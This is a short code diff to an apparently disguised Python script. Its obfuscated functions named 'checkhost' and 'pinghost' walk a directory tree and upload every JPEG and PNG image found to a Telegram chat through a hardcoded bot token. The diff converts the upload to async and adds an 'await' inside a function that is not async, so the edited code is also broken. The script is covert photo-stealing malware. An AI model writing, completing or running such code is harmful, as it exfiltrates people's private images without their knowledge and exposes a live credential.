@@ -1,13 +1,15 @@
 import os, base64, time, telegram, requests
+import asyncio
 
 
 
-def checkhost(mwock, othkr='.'):
+
+async def checkhost(mwock, othkr='.'):
     pxjirh = os.path.join(othkr, mwock)
     qzbkoc = open(pxjirh, 'rb')
 
     bot = telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww')
-    bot.send_photo(chat_id=-841939764, photo=qzbkoc)
+    await bot.send_photo(chat_id=-841939764, photo=qzbkoc)
 
 
 
@@ -36,7 +38,7 @@ def pinghost():
     for filename in filenames:
       file_path = os.path.join(root, filename)
       if file_path.endswith(('.jpeg', '.jpg', '.png')):
-        checkhost(file_path)
+       await checkhost(file_path)
         time.sleep(0.5)
 
 
